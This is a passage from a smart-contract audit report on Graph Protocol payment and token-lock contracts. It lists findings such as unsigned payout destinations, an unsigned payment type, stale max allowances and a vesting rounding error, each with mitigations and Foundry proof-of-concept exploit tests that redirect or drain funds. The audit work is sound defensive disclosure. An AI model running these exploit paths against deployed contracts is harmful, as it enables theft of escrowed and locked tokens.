    uint256 public lastAmount;
    uint256 public lastDataServiceCut;
    address public lastReceiverDestination;
    function collect(
        IGraphPayments.PaymentTypes,
        address payer,
        address receiver,
        uint256 amount,
        address dataService,
        uint256 dataServiceCut,
        address receiverDestination
    ) external {
        lastPayer = payer;
        lastReceiver = receiver;
        lastAmount = amount;
        lastDataService = dataService;
        lastDataServiceCut = dataServiceCut;
        lastReceiverDestination = receiverDestination;
    }
}

contract GraphTallyCollectorUnsignedParamsTest is Test {
    function testDataServiceCanChooseUnsignedCutAndDestination() public {
        uint256 signerPk = 0xA11CE;
        address signer = vm.addr(signerPk);
        address payer = address(0x1001);
        address serviceProvider = address(0x2002);
        address dataService = address(0x3003);
        address attackerDestination = address(0x4444);

        MockStaking staking = new MockStaking();
        MockEscrow escrow = new MockEscrow();
        MockController controller = new MockController(address(staking), address(escrow));
        GraphTallyCollector collector = new GraphTallyCollector("GraphTallyCollector", "1", address(controller), 7 days);

        uint256 deadline = block.timestamp + 1 days;
        bytes32 authHash = keccak256(abi.encodePacked(block.chainid, address(collector), "authorizeSignerProof", deadline, payer));
        bytes32 authDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", authHash));
        (uint8 av, bytes32 ar, bytes32 as_) = vm.sign(signerPk, authDigest);
        vm.prank(payer);
        collector.authorizeSigner(signer, deadline, abi.encodePacked(ar, as_, av));

        IGraphTallyCollector.ReceiptAggregateVoucher memory rav = IGraphTallyCollector.ReceiptAggregateVoucher({
            collectionId: bytes32("collection"),
            payer: payer,
            serviceProvider: serviceProvider,
            dataService: dataService,
            timestampNs: uint64(block.timestamp * 1e9),
            valueAggregate: uint128(1_000_000 ether),
            metadata: ""
        });
        bytes32 ravDigest = collector.encodeRAV(rav);
        (uint8 rv, bytes32 rr, bytes32 rs) = vm.sign(signerPk, ravDigest);
        IGraphTallyCollector.SignedRAV memory signedRAV = IGraphTallyCollector.SignedRAV({
            rav: rav,
            signature: abi.encodePacked(rr, rs, rv)
        });

        bytes memory data = abi.encode(signedRAV, uint256(1_000_000), attackerDestination);
        vm.prank(dataService);
        collector.collect(IGraphPayments.PaymentTypes(0), data);

        assertEq(escrow.lastPayer(), payer);
        assertEq(escrow.lastReceiver(), serviceProvider);
        assertEq(escrow.lastDataService(), dataService);
        assertEq(escrow.lastAmount(), 1_000_000 ether);
        assertEq(escrow.lastDataServiceCut(), 1_000_000);
        assertEq(escrow.lastReceiverDestination(), attackerDestination);
    }
}

## Suggested Mitigation
Bind all payment-affecting parameters to the signed authorization. Add paymentType, dataServiceCut, and receiverDestination to the EIP712 RAV typehash, or require an independent service-provider authorization for dataServiceCut and receiverDestination. Also validate dataServiceCut <= 1_000_000 in GraphTallyCollector before calling escrow.


## [H-116]. Unsigned receiverDestination lets GraphTallyCollector.collect redirect service-provider payouts

## id: VQKcGszzCjO6o-P5XLfDl

## Derived From Pattern/Invariant
UnsafeRecipient / AccessControlOrAuthByPass: receiver payout destination must be authorized by the signed serviceProvider

## Exploit Type
AuthByPass

## Location
GraphTallyCollector._collect

## Finding Status: Valid
### Finding Status Justification: This is the same receiverDestination authorization issue expressed at _collect level, and the vulnerable path is present. _collect decodes receiverDestination from _data supplied by the caller and forwards it to _graphPaymentsEscrow().collect while setting receiver to signedRAV.rav.serviceProvider. _encodeRAV omits receiverDestination, so a valid RAV binds the serviceProvider identity but not the destination where the receiver side is sent. The only caller restriction is that msg.sender must equal rav.dataService, plus signer authorization and active provision checks; none fully prevents the dataService from choosing an arbitrary receiverDestination. tokensCollected is then incremented for the honest serviceProvider/payer tuple before the escrow call, consuming the aggregate. GraphTallyCollector is listed in the audit scope. There is no exact documentation saying the protocol intentionally lets the dataService redirect receiver payouts without provider authorization. The exploit path exists in current code and does not depend on a future upgrade, privileged administrator, compromised credential, or a pure user mistake without a protocol flaw.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The RAV signature binds collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata, but it does not bind the payout destination. _collect decodes receiverDestination directly from caller-controlled calldata and forwards it to escrow: `(SignedRAV memory signedRAV, uint256 dataServiceCut, address receiverDestination) = abi.decode(_data, (SignedRAV, uint256, address)); ... address receiver = signedRAV.rav.serviceProvider; ... _graphPaymentsEscrow().collect(_paymentType, signedRAV.rav.payer, receiver, tokensToCollect, dataService, dataServiceCut, receiverDestination);`. Because msg.sender only needs to equal signedRAV.rav.dataService, a malicious or compromised dataService can submit a valid RAV naming an honest serviceProvider while replacing receiverDestination with an attacker address. tokensCollected is then incremented for the honest serviceProvider tuple, consuming the collectible aggregate while escrow is instructed to pay elsewhere.

## Impact
A dataService can steal serviceProvider payments from PaymentsEscrow and permanently consume the signed aggregate for the honest provider, causing direct loss of escrowed GRT and preventing later legitimate collection for the same RAV amount.

## Proof of Concept
1. Payer authorizes a signer. 2. The signer signs a RAV for payer, honest serviceProvider, and attacker-controlled dataService. The signed RAV does not include receiverDestination. 3. The attacker calls collect as the RAV dataService and ABI-encodes receiverDestination = attacker. 4. GraphTallyCollector verifies the RAV, increments tokensCollected[dataService][collectionId][serviceProvider][payer], and calls PaymentsEscrow.collect with receiver = serviceProvider but receiverDestination = attacker. 5. Escrow pays the attacker-controlled destination while the serviceProvider's collectible aggregate is consumed.

## Proof of Code
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {GraphTallyCollector} from "../contracts/payments/collectors/GraphTallyCollector.sol";
import {IGraphPayments} from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";
import {IGraphTallyCollector} from "@graphprotocol/interfaces/contracts/horizon/IGraphTallyCollector.sol";

contract MockController { mapping(bytes32 => address) public proxies; function set(bytes memory name, address value) external { proxies[keccak256(name)] = value; } function getContractProxy(bytes32 name) external view returns (address) { return proxies[name]; } }
contract MockStaking { function getProviderTokensAvailable(address, address) external pure returns (uint256) { return 1; } }
contract MockEscrow { address public lastReceiverDestination; mapping(address => uint256) public paid; function collect(IGraphPayments.PaymentTypes, address, address, uint256 tokens, address, uint256, address receiverDestination) external { lastReceiverDestination = receiverDestination; paid[receiverDestination] += tokens; } }

contract GraphTallyCollectorRedirectTest is Test {
    GraphTallyCollector collector; MockEscrow escrow; uint256 signerPk = 0xA11CE; address signer; address payer = address(0x1001); address provider = address(0x2002); address dataService = address(0x3003); address attacker = address(0x4444);
    function setUp() public { MockController controller = new MockController(); MockStaking staking = new MockStaking(); escrow = new MockEscrow(); address dummy = address(0xBEEF); controller.set(bytes("GraphToken"), dummy); controller.set(bytes("Staking"), address(staking)); controller.set(bytes("GraphPayments"), dummy); controller.set(bytes("PaymentsEscrow"), address(escrow)); controller.set(bytes("EpochManager"), dummy); controller.set(bytes("RewardsManager"), dummy); controller.set(bytes("GraphTokenGateway"), dummy); controller.set(bytes("GraphProxyAdmin"), dummy); controller.set(bytes("Curation"), dummy); collector = new GraphTallyCollector("GraphTallyCollector", "1", address(controller), 1 days); signer = vm.addr(signerPk); uint256 deadline = block.timestamp + 1 days; bytes32 messageHash = keccak256(abi.encodePacked(block.chainid, address(collector), "authorizeSignerProof", deadline, payer)); bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)); (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest); vm.prank(payer); collector.authorizeSigner(signer, deadline, abi.encodePacked(r, s, v)); }
    function signedRAV(bytes32 cid, uint128 amount) internal returns (IGraphTallyCollector.SignedRAV memory sr) { IGraphTallyCollector.ReceiptAggregateVoucher memory rav = IGraphTallyCollector.ReceiptAggregateVoucher({collectionId: cid, payer: payer, serviceProvider: provider, dataService: dataService, timestampNs: uint64(block.timestamp), valueAggregate: amount, metadata: bytes("")}); bytes32 digest = collector.encodeRAV(rav); (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest); sr = IGraphTallyCollector.SignedRAV({rav: rav, signature: abi.encodePacked(r, s, v)}); }
    function test_unsignedReceiverDestinationRedirectsPayout() public { bytes32 cid = keccak256("cid"); IGraphTallyCollector.SignedRAV memory sr = signedRAV(cid, 100 ether); bytes memory data = abi.encode(sr, uint256(0), attacker); vm.prank(dataService); uint256 collected = collector.collect(IGraphPayments.PaymentTypes(0), data, 0); assertEq(collected, 100 ether); assertEq(escrow.lastReceiverDestination(), attacker); assertEq(escrow.paid(attacker), 100 ether); assertEq(escrow.paid(provider), 0); assertEq(collector.tokensCollected(dataService, cid, provider, payer), 100 ether); }
}

## Suggested Mitigation
Bind receiverDestination in the signed RAV, or require receiverDestination == signedRAV.rav.serviceProvider unless the serviceProvider has separately authorized the destination on-chain or in an included signature field. Perform this validation before incrementing tokensCollected or calling escrow.


## [H-117]. RAV omits paymentType so GraphTallyCollector.collect can debit an unauthorized escrow bucket

## id: dc08N1iIOjknfncyCT9i2

## Derived From Pattern/Invariant
AccountingInvariantViolation / AccessControlOrAuthByPass: every collection must be authorized for the exact escrow payment type debited

## Exploit Type
AuthByPass

## Location
GraphTallyCollector._collect

## Finding Status: Valid
### Finding Status Justification: The claimed omission is mechanically true. EIP712_RAV_TYPEHASH and _encodeRAV do not include paymentType, while _collect takes _paymentType from collect's external argument and forwards it to PaymentsEscrow.collect. The replay/consumption component is also supported by the tokensCollected mapping, which is keyed by dataService, collectionId, receiver, and payer but not paymentType. Thus collection under one paymentType advances the aggregate for all payment types sharing that tuple. The code contains no complete safeguard that restricts paymentType to a signed value or keys collection accounting per paymentType. This is in analyzed production source and GraphTallyCollector is explicitly in scope. The provided docs/comments do not explicitly accept unauthorized cross-bucket collection as intentional. Assuming PaymentTypes represent distinct escrow accounting categories, which is inherent in the enum usage and finding, a valid RAV dataService can execute the path now. It does not require governance/admin abuse, compromised keys, social engineering, or future code changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The RAV hash omits paymentType, while _collect accepts `_paymentType` as an unsigned external parameter and forwards it to escrow. The signed hash is built from only `collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, keccak256(metadata)`, but settlement executes `_graphPaymentsEscrow().collect(_paymentType, signedRAV.rav.payer, receiver, tokensToCollect, dataService, dataServiceCut, receiverDestination);`. tokensCollected is also keyed only by dataService, collectionId, receiver, and payer, not by paymentType. Therefore the dataService can take a RAV intended for one payment category and submit it against a different PaymentTypes bucket, consuming the aggregate for all buckets and debiting escrow state the signer never authorized.

## Impact
If PaymentTypes correspond to distinct escrow liabilities, a malicious dataService can drain payer funds from the wrong escrow category and block later collection from the intended category because tokensCollected advances globally for the tuple.

## Proof of Concept
1. Payer has escrowed GRT under multiple PaymentTypes. 2. Payer's authorized signer signs a RAV for a specific off-chain payment category, but paymentType is not part of the signed data. 3. The dataService submits the same SignedRAV with a different `_paymentType`. 4. GraphTallyCollector accepts the signature, increments tokensCollected for the tuple, and calls PaymentsEscrow.collect with the attacker-selected paymentType. 5. The unintended escrow bucket is debited, and the intended bucket cannot later use the same aggregate because tokensCollected has already advanced.

## Proof of Code
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {GraphTallyCollector} from "../contracts/payments/collectors/GraphTallyCollector.sol";
import {IGraphPayments} from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";
import {IGraphTallyCollector} from "@graphprotocol/interfaces/contracts/horizon/IGraphTallyCollector.sol";

contract MockController { mapping(bytes32 => address) public proxies; function set(bytes memory name, address value) external { proxies[keccak256(name)] = value; } function getContractProxy(bytes32 name) external view returns (address) { return proxies[name]; } }
contract MockStaking { function getProviderTokensAvailable(address, address) external pure returns (uint256) { return 1; } }
contract MockEscrow { uint8 public lastPaymentType; mapping(uint8 => uint256) public debited; function collect(IGraphPayments.PaymentTypes paymentType, address, address, uint256 tokens, address, uint256, address) external { lastPaymentType = uint8(paymentType); debited[uint8(paymentType)] += tokens; } }

contract GraphTallyCollectorPaymentTypeTest is Test {
    GraphTallyCollector collector; MockEscrow escrow; uint256 signerPk = 0xA11CE; address signer; address payer = address(0x1001); address provider = address(0x2002); address dataService = address(0x3003);
    function setUp() public { MockController controller = new MockController(); MockStaking staking = new MockStaking(); escrow = new MockEscrow(); address dummy = address(0xBEEF); controller.set(bytes("GraphToken"), dummy); controller.set(bytes("Staking"), address(staking)); controller.set(bytes("GraphPayments"), dummy); controller.set(bytes("PaymentsEscrow"), address(escrow)); controller.set(bytes("EpochManager"), dummy); controller.set(bytes("RewardsManager"), dummy); controller.set(bytes("GraphTokenGateway"), dummy); controller.set(bytes("GraphProxyAdmin"), dummy); controller.set(bytes("Curation"), dummy); collector = new GraphTallyCollector("GraphTallyCollector", "1", address(controller), 1 days); signer = vm.addr(signerPk); uint256 deadline = block.timestamp + 1 days; bytes32 messageHash = keccak256(abi.encodePacked(block.chainid, address(collector), "authorizeSignerProof", deadline, payer)); bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)); (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest); vm.prank(payer); collector.authorizeSigner(signer, deadline, abi.encodePacked(r, s, v)); }
    function signedRAV(bytes32 cid, uint128 amount) internal returns (IGraphTallyCollector.SignedRAV memory sr) { IGraphTallyCollector.ReceiptAggregateVoucher memory rav = IGraphTallyCollector.ReceiptAggregateVoucher({collectionId: cid, payer: payer, serviceProvider: provider, dataService: dataService, timestampNs: uint64(block.timestamp), valueAggregate: amount, metadata: bytes("")}); bytes32 digest = collector.encodeRAV(rav); (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest); sr = IGraphTallyCollector.SignedRAV({rav: rav, signature: abi.encodePacked(r, s, v)}); }
    function test_unsignedPaymentTypeDebitsCallerChosenBucket() public { bytes32 cid = keccak256("cid"); IGraphTallyCollector.SignedRAV memory sr = signedRAV(cid, 100 ether); bytes memory data = abi.encode(sr, uint256(0), provider); vm.prank(dataService); uint256 collected = collector.collect(IGraphPayments.PaymentTypes(1), data, 0); assertEq(collected, 100 ether); assertEq(escrow.lastPaymentType(), 1); assertEq(escrow.debited(1), 100 ether); assertEq(collector.tokensCollected(dataService, cid, provider, payer), 100 ether); }
}

## Suggested Mitigation
Include paymentType in ReceiptAggregateVoucher and EIP712_RAV_TYPEHASH, or derive paymentType from signed RAV metadata with strict validation. If payment types are independent liabilities, also key tokensCollected by paymentType so collection in one bucket cannot consume another bucket's aggregate.


## [M-118]. Removed token destinations retain max allowance from token lock wallets

## id: 3Jw5fNBgFZQIZXBWZOabx

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation: removed token destination keeps prior wallet allowances

## Exploit Type
GlobalParamMidFlowManipulation

## Location
GraphTokenLockWallet.approveProtocol

## Finding Status: Valid
### Finding Status Justification: GraphTokenLockWallet.approveProtocol grants max allowance to the current getTokenDestinations list. GraphTokenLockManager.removeTokenDestination removes the spender from that list, and revokeProtocol later zeros only the new list. The removed spender's ERC20 allowance is not touched. The contracts are in scope, and there is no complete safeguard or documented design acceptance of stale spend authority.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
approveProtocol grants type(uint256).max allowance from the wallet to every destination currently returned by manager.getTokenDestinations(). GraphTokenLockManager.removeTokenDestination only removes the address from the manager set; it cannot clear allowances already granted by existing wallets. revokeProtocol later iterates the current destination set, so a removed destination is skipped and its old allowance remains. Vulnerable snippets: approveProtocol loops over dstList and calls token.approve(dstList[i], type(uint256).max); removeTokenDestination only calls _tokenDestinations.remove(_dst); revokeProtocol loops over the new dstList and approves 0 only for current destinations.

## Impact
A destination that is no longer authorized by the manager can still transfer locked GRT from wallets that approved it earlier. If that destination is compromised, deprecated, or externally callable, removing it from the manager does not protect already-approved token lock balances.

## Proof of Concept
1. The manager has destination D in _tokenDestinations. 2. A beneficiary calls approveProtocol(), granting D max allowance from the wallet. 3. The manager owner removes D. 4. manager.isTokenDestination(D) returns false. 5. The beneficiary calls revokeProtocol(), but D is not in the returned destination list and its allowance is not cleared. 6. D can still call token.transferFrom(wallet, attacker, amount) against the stale allowance.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import "forge-std/Test.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract StaleDestinationAllowancePoC is Test {
    function testRemovedDestinationKeepsAllowance() public {
        address owner = address(this);
        address beneficiary = address(0xB0B);
        address removedDestination = address(0xD00D);
        address attacker = address(0xBAD);
        MockERC20 token = new MockERC20();
        GraphTokenLockWallet master = new GraphTokenLockWallet();
        GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(master));
        token.mint(address(manager), 100 ether);
        manager.createTokenLockWallet(owner, beneficiary, 100 ether, 1, 101, 1, 0, 0, IGraphTokenLock.Revocability.Disabled);
        bytes memory initializer = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), owner, beneficiary, address(token), 100 ether, 1, 101, 1, 0, 0, IGraphTokenLock.Revocability.Disabled);
        address wallet = manager.getDeploymentAddress(keccak256(initializer), address(master));
        manager.addTokenDestination(removedDestination);
        vm.prank(beneficiary);
        GraphTokenLockWallet(payable(wallet)).approveProtocol();
        assertEq(token.allowance(wallet, removedDestination), type(uint256).max);
        manager.removeTokenDestination(removedDestination);
        assertTrue(!manager.isTokenDestination(removedDestination));
        vm.prank(beneficiary);
        GraphTokenLockWallet(payable(wallet)).revokeProtocol();
        assertEq(token.allowance(wallet, removedDestination), type(uint256).max);
        vm.prank(removedDestination);
        token.transferFrom(wallet, attacker, 1 ether);
        assertEq(token.balanceOf(attacker), 1 ether);
    }
}

## Suggested Mitigation
Track per-wallet approved destinations or add an explicit per-wallet revoke function for removed destinations. Avoid relying on the current global set to clean historical approvals; clear old allowances before or during destination removal, or require finite per-action allowances instead of max approval.


## [M-119]. approveProtocol grants unlimited spending from revocable wallets despite protocol forwarding being disabled

## id: OASc81Cvao4n37EZtIodX

## Derived From Pattern/Invariant
Revocable locks must not grant protocol allowances

## Exploit Type
AccessControl

## Location
GraphTokenLockWallet.approveProtocol

## Finding Status: Valid
### Finding Status Justification: GraphTokenLockWallet.fallback explicitly blocks forwarded calls when revocable is Enabled, but approveProtocol has no equivalent revocability check and grants max allowance to every manager token destination. Token destinations are intended to pull funds, so a revocable wallet can still expose locked GRT through allowance despite forwarded protocol calls being disabled. No complete safeguard is present. The wallet is in scope. Calling approveProtocol requires the beneficiary, but that is not an admin/trusted-role abuse case. The risk is current, not documented as accepted, and not merely user mistake.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
The fallback correctly prevents revocable wallets from forwarding protocol calls, but approveProtocol() has no equivalent revocability check. A revocable wallet beneficiary can grant max allowance to every manager token destination even though revocable locks are intended to be unable to participate in protocol calls.

Vulnerable snippet:
fallback() external {
    require(revocable == Revocability.Disabled, "Revocable contracts cannot forward calls");
    ...
}

function approveProtocol() external onlyBeneficiary {
    address[] memory dstList = manager.getTokenDestinations();
    for (uint256 i = 0; i < dstList.length; i++) {
        token.approve(dstList[i], type(uint256).max);
    }
}

This splits the authorization model: function-call forwarding is blocked for revocable locks, but token-spending approval is still granted.

## Impact
Revocable locked GRT can be pulled by approved protocol destinations even though the wallet disallows revocable protocol participation. This bypasses the owner/beneficiary lock restriction model and can move funds out before the owner exercises revocation.

## Proof of Concept
1. A wallet is initialized with revocable == Revocability.Enabled and funded with locked GRT.
2. The manager contains a token destination.
3. Beneficiary calls approveProtocol(); the call succeeds and gives the destination uint256.max allowance.
4. The destination pulls tokens from the revocable wallet with transferFrom even though fallback-based protocol interaction would revert for the same wallet.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.3;

import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";

interface Vm { function prank(address) external; }

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract MockManager {
    address[] internal dst;
    function setDestinations(address[] memory d) public { dst = d; }
    function getTokenDestinations() external view returns (address[] memory) { return dst; }
    function getAuthFunctionCallTarget(bytes4) external view returns (address) { return address(0); }
}

contract RevocableApprovePoC {
    Vm constant vm = Vm(address(bytes20(uint160(uint256(keccak256("hevm cheat code"))))));
    function assertEq(uint256 a, uint256 b) internal { require(a == b, "not eq"); }
    function assertGt(uint256 a, uint256 b) internal { require(a > b, "not gt"); }

    function testRevocableWalletCanStillApproveProtocolSpender() external {
        address owner = address(0xA11CE);
        address beneficiary = address(0xB0B);
        address destination = address(0xDAD);
        MockToken token = new MockToken();
        MockManager manager = new MockManager();
        address[] memory dst = new address[](1);
        dst[0] = destination;
        manager.setDestinations(dst);
        GraphTokenLockWallet wallet = new GraphTokenLockWallet();
        wallet.initialize(address(manager), owner, beneficiary, address(token), 1000, 100, 200, 10, 0, 0, IGraphTokenLock.Revocability.Enabled);
        token.mint(address(wallet), 1000);

        vm.prank(beneficiary);
        wallet.approveProtocol();
        assertEq(token.allowance(address(wallet), destination), type(uint256).max);

        vm.prank(destination);
        token.transferFrom(address(wallet), destination, 1000);
        assertGt(token.balanceOf(destination), 0);
    }
}

## Suggested Mitigation
Add require(revocable == Revocability.Disabled, "Revocable contracts cannot approve protocol") to approveProtocol(), or otherwise enforce that revocable wallets have zero allowance to all protocol destinations.


## [H-120]. Revocable GraphTokenLockWallet can grant max token allowances and bypass locked-token transfer restrictions

## id: X0itUNIgi-JAjkzgLz1ZK

## Derived From Pattern/Invariant
MaturityorGatingByPass / AccessControlOrAuthByPass: revocable locks must not be able to move managed tokens through protocol flows before vesting

## Exploit Type
AuthByPass

## Location
GraphTokenLockWallet.approveProtocol

## Finding Status: Valid
### Finding Status Justification: The exact asymmetry exists. fallback requires revocable == Disabled before forwarding protocol calls, but approveProtocol is onlyBeneficiary and does not check revocable. It grants unlimited token allowance to current token destinations, enabling those destinations to pull GRT from a revocable wallet if they expose a transferFrom path. There is no complete safeguard limiting approvals to non-revocable wallets or releasable funds. This is in-scope production code. The beneficiary path is available today and is not a privileged/admin abuse requirement, not explicit design acceptance, and not future speculation.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`GraphTokenLockWallet.fallback()` explicitly blocks forwarded protocol calls when `revocable == Revocability.Enabled`, but `approveProtocol()` has no equivalent revocability gate and grants every current token destination unlimited allowance over the wallet's GRT. Vulnerable snippet: `function approveProtocol() external onlyBeneficiary { address[] memory dstList = manager.getTokenDestinations(); for (uint256 i = 0; i < dstList.length; i++) { token.approve(dstList[i], type(uint256).max); } }`. Because token destinations are the contracts intended to pull funds from token locks, a revocable wallet beneficiary can enable those destinations to transfer locked GRT out of the wallet even though direct forwarded protocol participation is disabled for revocable locks.

## Impact
Locked revocable GRT can be moved out of the wallet before the vesting/revocation model intends. For large token distribution wallets this can bypass the owner's ability to revoke unvested funds and can directly remove >$1M of locked GRT from the custody contract via an approved destination.

## Proof of Concept
1. A revocable wallet is initialized and funded with locked GRT. 2. The manager has a token destination that can pull GRT with `transferFrom`. 3. The beneficiary calls `approveProtocol()`. 4. Despite revocable wallets being blocked in `fallback()`, the destination now has `uint256.max` allowance. 5. The destination pulls the wallet's managed balance before vesting/revocation should allow it.

## Proof of Code
pragma solidity ^0.7.3;
import 'forge-std/Test.sol';
import '../contracts/GraphTokenLockWallet.sol';

contract MockGRT {
    string public constant name = 'Mock GRT';
    string public constant symbol = 'GRT';
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, 'bal'); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, 'bal'); uint256 allowed = allowance[from][msg.sender]; require(allowed >= amount, 'allow'); if (allowed != uint256(-1)) allowance[from][msg.sender] = allowed - amount; balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true; }
}

contract MockManager {
    address[] internal dst;
    function setDestinations(address[] memory d) public { delete dst; for (uint256 i = 0; i < d.length; i++) dst.push(d[i]); }
    function getTokenDestinations() external view returns (address[] memory) { return dst; }
    function getAuthFunctionCallTarget(bytes4) external view returns (address) { return address(0); }
}

contract Puller {
    function pull(MockGRT token, address from, address to, uint256 amount) external { require(token.transferFrom(from, to, amount), 'pull failed'); }
}

contract RevocableApproveBypassTest is Test {
    function testRevocableWalletCanApproveAndBeDrainedByDestination() public {
        address owner = address(0xA11CE);
        address beneficiary = address(0xB0B);
        address attacker = address(0xBAD);
        MockGRT token = new MockGRT();
        MockManager manager = new MockManager();
        Puller puller = new Puller();
        address[] memory dst = new address[](1);
        dst[0] = address(puller);
        manager.setDestinations(dst);
        GraphTokenLockWallet wallet = new GraphTokenLockWallet();
        wallet.initialize(address(manager), owner, beneficiary, address(token), 1_000 ether, 100, 1_000, 10, 0, 0, IGraphTokenLock.Revocability.Enabled);
        token.mint(address(wallet), 1_000 ether);
        vm.prank(beneficiary);
        wallet.approveProtocol();
        assertEq(token.allowance(address(wallet), address(puller)), uint256(-1));
        puller.pull(token, address(wallet), attacker, 1_000 ether);
        assertEq(token.balanceOf(attacker), 1_000 ether);
        assertEq(token.balanceOf(address(wallet)), 0);
    }
}


## Suggested Mitigation
Add `require(revocable == Revocability.Disabled, "Revocable contracts cannot approve protocol")` to `approveProtocol()`, or cap approvals to currently releasable/non-managed surplus only. Consider using per-call pull flows instead of unlimited allowances from locked wallets.


## [M-121]. Rounded periodDuration can unlock all managed tokens before endTime

## id: CQeJC-wExbcB_Xu6RzxSp

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
RoundingError

## Location
GraphTokenLock.availableAmount

## Finding Status: Valid
### Finding Status Justification: The vesting schedule completes at startTime plus periods times floor(duration / periods), not necessarily endTime. availableAmount uses uncapped passedPeriods * amountPerPeriod until currentTime is greater than endTime. This can unlock all managed tokens early, and periods greater than duration can also make periodDuration zero. No complete validation or cap exists in the scoped code.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
The vesting schedule computes periodDuration as duration().div(periods), then computes passedPeriods from sinceStartTime().div(periodDuration()). Because duration / periods is rounded down, the schedule completes at startTime + periods * floor(duration / periods), which can be materially earlier than endTime for high-frequency schedules. Vulnerable snippets: periodDuration() returns duration().div(periods); currentPeriod() returns sinceStartTime().div(periodDuration()).add(1); availableAmount() returns passedPeriods().mul(amountPerPeriod()) until currentTime() is greater than endTime. The correct formula should derive elapsed periods as elapsed * periods / duration and cap at periods.

## Impact
A beneficiary of a wallet with a valid but high-period schedule can release all managed GRT before the configured endTime, bypassing the intended lock or vesting maturity. If periods exceeds duration in seconds, periodDuration becomes zero and release/revoke views revert, also bricking the schedule.

## Proof of Concept
1. A wallet is initialized with startTime = 1000, endTime = 1100, periods = 60, and 600 GRT managed. 2. periodDuration rounds to 1 second. 3. At timestamp 1060, which is still 40 seconds before endTime, passedPeriods is already 60. 4. availableAmount equals the full managedAmount, so the beneficiary releases all tokens before maturity.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/IGraphTokenLock.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";

contract MockGRT2 is IERC20 {
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { uint256 a = allowance[from][msg.sender]; require(a >= amount); if (a != uint256(-1)) { allowance[from][msg.sender] = a - amount; } _transfer(from, to, amount); return true; }
    function _transfer(address from, address to, uint256 amount) internal { require(balanceOf[from] >= amount); balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); }
}

